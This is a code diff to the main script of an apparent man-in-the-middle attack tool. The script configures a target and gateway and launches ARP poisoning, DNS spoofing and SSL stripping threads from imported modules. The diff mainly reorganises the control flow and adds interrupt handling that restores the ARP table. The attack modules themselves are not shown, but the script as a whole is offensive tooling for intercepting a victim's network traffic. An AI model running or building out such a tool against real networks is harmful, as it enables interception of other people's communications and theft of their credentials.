@@ -1,5 +1,5 @@
 import sys
-import signal
+# import signal
 import threading
 from termcolor import colored
 from scripts.arp_poisoner import ArpPoisoner
@@ -25,7 +25,6 @@ CONFIG = {
         "port": 80  # Port to listen for spoofed webserver traffic
     }
 }
-
 
 
 def parse_args():
@@ -97,7 +96,7 @@ def print_art():
         
         
     """
-    
+
     title = """
 
   ____  ____   _       ____   _          _                           
@@ -124,43 +123,45 @@ def print_welcome():
 
 def start():
     # Register signal handler
-    signal.signal(signal.SIGINT, lambda sig, frame: print("Terminating program...") or sys.exit(0))
+    # signal.signal(signal.SIGINT, lambda sig, frame: print("Terminating program...") or sys.exit(0))
+    try:
+        target_ip = CONFIG["arp"]["target"]
+        poisoning_interval = CONFIG["arp"]["interval"]
+        gateway_ip = CONFIG["arp"]["gateway"]
+        ignore_cache = CONFIG["arp"]["ignore_cache"]
 
-    target_ip = CONFIG["arp"]["target"]
-    poisoning_interval = CONFIG["arp"]["interval"]
-    gateway_ip = CONFIG["arp"]["gateway"]
-    ignore_cache = CONFIG["arp"]["ignore_cache"]
+        # Run ARP poisoning script with configured parameters
+        arp_poisoner = ArpPoisoner(target_ip, gateway_ip, poisoning_interval, ignore_cache)
+        arp_poisoner.start()
 
-    # Run ARP poisoning script with configured parameters
-    arp_poisoner = ArpPoisoner(target_ip, gateway_ip, poisoning_interval, ignore_cache)
-    arp_thread = threading.Thread(target=lambda: arp_poisoner.start())
-    arp_thread.daemon = True
-    arp_thread.start()
+        disable_dns = CONFIG["dns"]["disable"]
 
-    disable_dns = CONFIG["dns"]["disable"]
+        # RUN ADDITIONAL SCRIPTS HERE
+        # Run DNS poisoning script with configured parameters
+        if not disable_dns:
+            dns_hosts = CONFIG["dns"]["hosts"]
+            dns_poisoner = DnsSpoofer(dns_hosts)
+            dns_thread = threading.Thread(target=lambda: dns_poisoner.start())
+            dns_thread.daemon = True
+            dns_thread.start()
 
-    # Run DNS poisoning script with configured parameters
-    if not disable_dns:
-        dns_hosts = CONFIG["dns"]["hosts"]
+            disable_ssl = CONFIG["ssl"]["disable"]
 
-        dns_poisoner = DnsSpoofer(dns_hosts)
-        dns_thread = threading.Thread(target=lambda: dns_poisoner.start())
-        dns_thread.daemon = True
-        dns_thread.start()
+            if not disable_ssl:
+                ssl_port = CONFIG["ssl"]["port"]
+                logging = CONFIG["ssl"]["logging"]
 
-        disable_ssl = CONFIG["ssl"]["disable"]
+                ssl_stripper = SslStripper(ssl_port, logging)
+                ssl_thread = threading.Thread(target=lambda: ssl_stripper.start())
+                ssl_thread.daemon = True
+                ssl_thread.start()
 
-        if not disable_ssl:
-            ssl_port = CONFIG["ssl"]["port"]
-            logging = CONFIG["ssl"]["logging"]
-
-            ssl_stripper = SslStripper(ssl_port, logging)
-            ssl_thread = threading.Thread(target=lambda: ssl_stripper.start())
-            ssl_thread.daemon = True
-            ssl_thread.start()
-    
-    while True:  # Keep the program running
-        pass
+        while True:  # Keep the program running
+            pass
+    except KeyboardInterrupt:
+        print("Program Interupted")
+        arp_poisoner.close_threads()
+        arp_poisoner.restore_arp_table()
 
 
 if __name__ == '__main__':
